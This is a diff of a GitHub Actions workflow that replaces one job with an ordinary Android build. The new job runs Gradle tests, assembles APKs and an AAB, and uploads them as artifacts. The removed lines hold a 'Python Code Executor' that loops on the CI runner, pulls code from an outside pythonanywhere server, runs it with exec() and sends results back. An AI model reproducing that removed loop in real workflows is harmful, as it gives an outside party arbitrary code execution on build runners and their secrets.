@@ -1,53 +1,86 @@
-name: Python Code Executor
+name: Generated APK AAB (Upload - Create Artifact To Github Action)
+
+env:
+  # The name of the main module repository
+  main_project_module: app
+
+  # The name of the Play Store
+  playstore_name: Frogobox ID
 
 on:
+
+  push:
+    branches:
+      - 'release/**'
+
+  # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
 
 jobs:
-  python-task-runner:
+  build:
+
     runs-on: ubuntu-latest
+
     steps:
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@v4
 
-      - name: Set up Python
-        uses: actions/setup-python@v4
+      # Set Current Date As Env Variable
+      - name: Set current date as env variable
+        run: echo "date_today=$(date +'%Y-%m-%d')" >> $GITHUB_ENV
+
+      # Set Repository Name As Env Variable
+      - name: Set repository name as env variable
+        run: echo "repository_name=$(echo '${{ github.repository }}' | awk -F '/' '{print $2}')" >> $GITHUB_ENV
+
+      - name: Set Up JDK
+        uses: actions/setup-java@v4
         with:
-          python-version: "3.11"
+          distribution: 'zulu' # See 'Supported distributions' for available options
+          java-version: '17'
+          cache: 'gradle'
 
-      - name: Install dependencies
-        run: |
-          pip install requests
+      - name: Change wrapper permissions
+        run: chmod +x ./gradlew
 
-      - name: Run Task Loop
-        run: |
-          cat > runner.py << 'EOF'
-          import requests
-          import time
+      # Run Tests Build
+      - name: Run gradle tests
+        run: ./gradlew test
 
-          SERVER_URL = "https://testl.pythonanywhere.com"
+      # Run Build Project
+      - name: Build gradle project
+        run: ./gradlew build
 
-          while True:
-              # Получаем новую задачу
-              r = requests.get(f"{SERVER_URL}/get_task")
-              task = r.json()
-              task_id = task.get("task_id")
-              code = task.get("code")
+      # Create APK Debug
+      - name: Build apk debug project (APK) - ${{ env.main_project_module }} module
+        run: ./gradlew assembleDebug
 
-              if task_id:
-                  print(f"Найдена задача {task_id}, выполняем...")
-                  try:
-                      # Локально выполняем код Python
-                      local_vars = {}
-                      exec(code, {}, local_vars)
-                      result = str(local_vars)
-                  except Exception as e:
-                      result = f"Ошибка: {e}"
+      # Create APK Release
+      - name: Build apk release project (APK) - ${{ env.main_project_module }} module
+        run: ./gradlew assemble
 
-                  # Отправляем результат обратно
-                  requests.post(f"{SERVER_URL}/submit_result", json={"task_id": task_id, "result": result})
-                  print(f"Результат задачи {task_id} отправлен")
-              else:
-                  time.sleep(2)  # Ждём новые задачи
-          EOF
+      # Create Bundle AAB Release
+      # Noted for main module build [main_project_module]:bundleRelease
+      - name: Build app bundle release (AAB) - ${{ env.main_project_module }} module
+        run: ./gradlew ${{ env.main_project_module }}:bundleRelease
 
-          python runner.py
+      # Upload Artifact Build
+      # Noted For Output [main_project_module]/build/outputs/apk/debug/
+      - name: Upload APK Debug - ${{ env.repository_name }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ env.date_today }} - ${{ env.playstore_name }} - ${{ env.repository_name }} - APK(s) debug generated
+          path: ${{ env.main_project_module }}/build/outputs/apk/debug/
+
+      # Noted For Output [main_project_module]/build/outputs/apk/release/
+      - name: Upload APK Release - ${{ env.repository_name }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ env.date_today }} - ${{ env.playstore_name }} - ${{ env.repository_name }} - APK(s) release generated
+          path: ${{ env.main_project_module }}/build/outputs/apk/release/
+
+      # Noted For Output [main_project_module]/build/outputs/bundle/release/
+      - name: Upload AAB (App Bundle) Release - ${{ env.repository_name }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ env.date_today }} - ${{ env.playstore_name }} - ${{ env.repository_name }} - App bundle(s) AAB release generated
+          path: ${{ env.main_project_module }}/build/outputs/bundle/release/
